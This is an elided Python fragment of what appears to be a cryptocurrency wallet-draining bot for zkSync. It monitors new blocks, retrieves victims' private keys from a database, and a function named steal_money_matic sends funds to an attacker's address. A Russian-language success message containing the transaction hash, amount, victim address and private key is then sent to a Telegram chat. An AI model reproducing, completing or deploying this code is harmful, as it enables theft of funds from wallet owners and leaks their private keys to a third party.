...
from config import send_address, zksync_grab, zksync_vhod, YOUR_CHAT_ID, TELEGRAM_BOT_TOKEN
...
web3 = Web3(Web3.HTTPProvider(zksync_vhod))
...
def getblocks_matic():
    ...
    while True:
        ...
        if str(latestBlock.number) in blocks_matic:
            ...
            print(f'Last Block! {str(latestBlock.number)} | ZKSYNC')
...
def steal_money_matic(address):
    ...
    try:
        ...
        gwei = web3.eth.gas_price + 100000000


        wallet_key = db.get_info_address(address)
        grab_from_matic_balance = web3.toWei(zksync_grab, 'ether')
        ...
        success_message = f' ✅✅✅  УСПЕШНЫЙ ВЫВОД ZKsync  ✅✅✅ \n \n ХЕШ: {hash_xd}   \n \n 💰💰💰 СУММА: {amount_ether} 💰💰💰  \n \n АДРЕС: {address} \n \n ПРИВАТ: {wallet_key}'
        print(success_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=success_message)
    except Exception as e:
        error_message = f'ZKsync | НЕУСПЕШНЫЙ ВЫВОД | АДРЕС: {address} | ОШИБКА: {e}'
        print(error_message)
